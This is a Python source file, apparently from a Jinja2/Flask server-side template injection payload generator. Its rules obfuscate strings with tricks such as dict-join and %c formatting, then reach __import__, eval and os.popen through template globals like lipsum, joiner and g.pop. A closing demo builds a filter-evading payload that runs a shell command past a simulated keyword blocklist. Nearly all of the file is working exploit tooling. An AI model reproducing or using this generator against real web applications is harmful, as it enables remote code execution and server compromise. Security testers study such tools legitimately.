def gen_string_lower1(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [c if c != "'" else "\\'" for c in value.upper()]
    return [(LITERAL, "'{}'.lower()".format("".join(chars)))]


@expression_gen
def gen_string_lower2(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [c if c != '"' else '\\"' for c in value.upper()]
    return [(LITERAL, '"{}".lower()'.format("".join(chars)))]


@expression_gen
def gen_string_lower3(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [c if c != "'" else "\\'" for c in value.upper()]
    return [(LITERAL, "'{}'.lower( )".format("".join(chars)))]


@expression_gen
def gen_string_lower4(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [c if c != '"' else '\\"' for c in value.upper()]
    return [(LITERAL, '"{}".lower( )'.format("".join(chars)))]


@expression_gen
def gen_string_lowerfilter1(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [c if c != "'" else "\\'" for c in value.upper()]
    return [(LITERAL, "'{}'|lower".format("".join(chars)))]


@expression_gen
def gen_string_lowerfilter2(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [c if c != '"' else '\\"' for c in value.upper()]
    return [(LITERAL, '"{}"|lower'.format("".join(chars)))]




@expression_gen
def gen_string_concat1(context: dict, value: str):
    return [
        (
            LITERAL,
            "({})".format(
                "+".join("'{}'".format(c if c != "'" else "\\'") for c in value)
            ),
        )
    ]


@expression_gen
def gen_string_concat2(context: dict, value: str):
    return [
        (
            LITERAL,
            "({})".format(
                "+".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
            ),
        )
    ]


@expression_gen
def gen_string_concat3(context: dict, value: str):
    return [
        (
            LITERAL,
            "({})".format(
                "".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
            ),
        )
    ]


@expression_gen
def gen_string_chars(context: dict, value: str):
    ans: List[Any] = [(LITERAL, "("), (CHAR, value[0])]
    for c in value[1:]:
        ans.append((STRING_STRING_CONCAT,))
        ans.append((CHAR, c))
    ans.append(
        (LITERAL, ")"),
    )
    return ans


@expression_gen
def gen_string_dictjoin(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [(UNSATISFIED,)]
    return [(LITERAL, "(dict({}=x)|join)".format(value))]


@expression_gen
def gen_string_splitdictjoin(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [(UNSATISFIED,)]
    parts = [value[i : i + 3] for i in range(0, len(value), 3)]
    req = []
    for i, part in enumerate(parts):
        if i != 0:
            req.append((STRING_STRING_CONCAT,))
        req.append((LITERAL, "(dict({}=x)|join)".format(part)))
    return req


@expression_gen
def gen_string_splitdictjoin2(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [(UNSATISFIED,)]
    parts = [value[i : i + 3] for i in range(0, len(value), 3)]

    if len(set(parts)) != len(parts):
        return [(UNSATISFIED,)]

    return [
        (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in parts)))
    ]


@expression_gen
def gen_string_splitdictjoin3(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [(UNSATISFIED,)]

    if len(set(value)) != len(value):
        return [(UNSATISFIED,)]

    return [
        (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in value)))
    ]


@expression_gen
def gen_string_formatpercent(context: dict, value: str):
    # (('%c'*n)%(97,98,99))
    req = []
    req.append((LITERAL, "(("))
    req.append((STRING_MANY_PERCENT_LOWER_C, len(value)))
    req.append((LITERAL, ")%("))
    for i, c in enumerate(value):
        if i != 0:
            req.append((LITERAL, ","))
        req.append((INTEGER, ord(c)))
    req.append((LITERAL, "))"))
    return req


@expression_gen
def gen_string_formatfunc(context: dict, value: str):
    # (('%c'*n)|format(97,98,99))
    req = []
    req.append((LITERAL, "(("))
    req.append((STRING_MANY_PERCENT_LOWER_C, len(value)))
    req.append((LITERAL, ")|format("))
    for i, c in enumerate(value):
        if i != 0:
            req.append((LITERAL, ","))
        req.append((INTEGER, ord(c)))
    req.append((LITERAL, "))"))
    return req


@expression_gen
def gen_string_formatfunc2(context: dict, value: str):
    # (FORMAT(97,98,99))
    # FORMAT = (CS.format)
    # CS = (C*L)
    if re.match("^[a-z]+$", value):  # avoid infinite recursion
        return [(UNSATISFIED,)]
    if "{:c}" not in context.values():
        return [(UNSATISFIED,)]
    k = [k for k, v in context.values() if v == "{:c}"][0]
    cs = "({c}*{l})".format(c=k, l=len(value))
    format_func = (ATTRIBUTE, (LITERAL, cs), "format")
    req = [
        (LITERAL, "("),
        format_func,
        (LITERAL, "("),
        (LITERAL, ",".join(str(ord(c)) for c in value)),
        (LITERAL, "))"),
    ] + [(WITH_CONTEXT_VAR, k)]
    return req


@expression_gen
def gen_string_formatfunc3(context: dict, value: str):
    # (FORMAT(97,98,99))
    # FORMAT = (CS.format)
    # CS = (C*L)
    if re.match("^[a-z]+$", value):  # avoid infinite recursion
        return [(UNSATISFIED,)]
    # cs = "(({c})*{l})".format(
    #     c="{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=x)|join)",
    #     l=len(value)
    # )
    format_func = (ATTRIBUTE, (STRING_MANY_FORMAT_C, len(value)), "format")
    req = [
        (LITERAL, "("),
        format_func,
        (LITERAL, "("),
        (LITERAL, ",".join(str(ord(c)) for c in value)),
        (LITERAL, "))"),
    ]
    return req


# ---


@expression_gen
def gen_attribute_normal1(context, obj_req, attr_name):
    if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", attr_name):
        return [(UNSATISFIED,)]
    return [
        obj_req,
        (LITERAL, "."),
        (LITERAL, attr_name),
    ]


@expression_gen
def gen_attribute_normal2(context, obj_req, attr_name):
    return [
        obj_req,
        (LITERAL, "["),
        (STRING, attr_name),
        (LITERAL, "]"),
    ]


@expression_gen
def gen_attribute_attrfilter(context, obj_req, attr_name):
    return [
        (LITERAL, "("),
        obj_req,
        (LITERAL, "|attr("),
        (STRING, attr_name),
        (LITERAL, "))"),
    ]


# ---


@expression_gen
def gen_item_normal1(context, obj_req, item_name):
    if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", item_name):
        return [(UNSATISFIED,)]
    return [
        obj_req,
        (LITERAL, "."),
        (LITERAL, item_name),
    ]


@expression_gen
def gen_item_normal2(context, obj_req, item_name):
    return [
        obj_req,
        (LITERAL, "["),
        (STRING, item_name),
        (LITERAL, "]"),
    ]


@expression_gen
def gen_item_dunderfunc(context, obj_req, item_name):
    return [
        (ATTRIBUTE, obj_req, "__getitem__"),
        (LITERAL, "("),
        (STRING, item_name),
        (LITERAL, ")"),
    ]


# ---


@expression_gen
def gen_class_attribute_literal(context, obj_req, attr_name):
    # obj.__class__.attr
    return [
        (
            ATTRIBUTE,
            obj_req,
            "__class__",
        ),
        (LITERAL, "." + attr_name),
    ]


@expression_gen
def gen_class_attribute_attrfilter(context, obj_req, attr_name):
    # obj.__class__.attr
    return [
        (LITERAL, "("),
        (
            ATTRIBUTE,
            obj_req,
            "__class__",
        ),
        (LITERAL, "|attr("),
        (STRING, attr_name),
        (LITERAL, "))"),
    ]


# ---


@expression_gen
def gen_chained_attribute_item_normal(context, obj_req, *attr_item_req):
    if not attr_item_req:
        return [
            obj_req,
        ]
    first_req, *other_req = attr_item_req
    req_type, req_name = first_req
    got_req = (
        req_type,
        obj_req,
        req_name,
    )
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            got_req,
            *other_req,
        ),
    ]


# ---


@expression_gen
def gen_import_func_g(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "pop"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "__import__"),
        )
    ]


@expression_gen
def gen_import_func_lipsum(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "lipsum"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "__import__"),
        )
    ]


@expression_gen
def gen_import_func_joiner(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "joiner"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "__import__"),
        )
    ]


@expression_gen
def gen_import_func_namespace(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "namespace"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "__import__"),
        )
    ]


# ---


@expression_gen
def gen_eval_func_g(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "pop"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_lipsum(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "lipsum"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_joiner(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "joiner"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_namespace(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "namespace"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


# ---


@expression_gen
def gen_eval_normal(context, eval_param):
    return [
        (LITERAL, "("),
        (EVAL_FUNC,),
        (LITERAL, "("),
        eval_param,
        (LITERAL, "))"),
    ]


# ---

# 获取flask配置的生成规则


@expression_gen
def gen_config_flask_context_var(context):
    return [(FLASK_CONTEXT_VAR, "config")]


@expression_gen
def gen_config_self(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "self"),
            (ATTRIBUTE, "__dict__"),
            (ITEM, "_TemplateReference__context"),
            (ITEM, "config"),
        )
    ]


# @req_gen
# def gen_config_request(context):
#     return [
#         (
#             CHAINED_ATTRIBUTE_ITEM,
#             (LITERAL, "request"),
#             (ATTRIBUTE, "application"),
#             (ATTRIBUTE, "__self__"),
#             (ATTRIBUTE, "json_module"),
#             (ATTRIBUTE, "JSONEncoder"),
#             (ATTRIBUTE, "default"),
#             (ATTRIBUTE, "__globals__"),
#             (ITEM, "current_app"),
#             (ATTRIBUTE, "config"),
#         )
#     ]


# ---


@expression_gen
def gen_module_os_import(context):
    return [
        (IMPORT_FUNC,),
        (LITERAL, "("),
        (STRING, "os"),
        (LITERAL, ")"),
    ]


@expression_gen
def gen_module_os_eval(context):
    return [
        (EVAL, (STRING, "__import__")),
        (LITERAL, "("),
        (STRING, "os"),
        (LITERAL, ")"),
    ]


@expression_gen
def gen_module_os_config(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (CONFIG,),
            (CLASS_ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


# ---


@expression_gen
def gen_os_popen_obj_normal(context, cmd):
    return [
        (LITERAL, "("),
        (ATTRIBUTE, (MODULE_OS,), "popen"),
        (LITERAL, "("),
        (STRING, cmd),
        (LITERAL, "))"),
    ]


@expression_gen
def gen_os_popen_obj_eval(context, cmd):
    cmd = cmd.replace("'", "\\'")
    return [(EVAL, (STRING, "__import__('os').popen('" + cmd + "')"))]


# ---


@expression_gen
def gen_os_popen_read_normal(context, cmd):
    return [
        (LITERAL, "("),
        (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
        (LITERAL, "())"),
    ]


@expression_gen
def gen_os_popen_read_normalspace(context, cmd):
    return [
        (LITERAL, "("),
        (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
        (LITERAL, "( ))"),
    ]


@expression_gen
def gen_os_popen_read_normal2(context, cmd):
    return [
        (LITERAL, "("),
        (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
        (LITERAL, "("),
        (INTEGER, -1),
        (LITERAL, "))"),
    ]


@expression_gen
def gen_os_popen_read_eval(context, cmd):
    return [
        (
            EVAL,
            (
                STRING,
                "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'")),
            ),
        ),
    ]


if __name__ == "__main__":
    import time
    import functools

    @functools.lru_cache(100)
    def waf_func(payload: str):
        time.sleep(0.2)
        return all(
            word not in payload
            for word in [
                "'",
                '"',
                ".",
                "_",
                "import",
                "request",
                "url",
                "\\x",
                "os",
                "system",
                "\\u",
                "22",
            ]
        )

    payload = generate(
        OS_POPEN_READ,
        "ls",
        waf_func=waf_func,
        context={"loo": 100, "lo": 10, "l": 1, "un": "_"},
    )
    print(payload)
